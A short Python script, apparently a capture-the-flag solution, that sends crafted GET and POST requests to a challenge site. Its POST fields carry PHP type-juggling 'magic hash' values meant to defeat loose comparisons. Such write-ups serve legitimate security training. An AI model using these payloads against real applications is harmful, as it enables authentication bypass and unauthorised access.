
#https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling
#https://www.youtube.com/watch?v=Jtb8Hncmbsg
import requests
url='https://php.0daygod.xyz/'
#Creating Custom Headers
headers={
'User-Agent':'Yes, I am a human.',
'Sagarmatha-Hacktoberfest-CTF':'https://hacktober.tk/',
}
#For GET request
payload={
	'hello':'hi',
	'world':'0x10001',
	'nice':'test',
	'ecin':'test',
}
r = requests.get(url, params=payload,headers=headers)

#For Post Request
payload={
	'ctf':'0e1137126905',
	'parm':'240610708',
	'mrap':'QNKCDZO',
}
r = requests.post(url, data=payload,headers=headers)
print(r.content)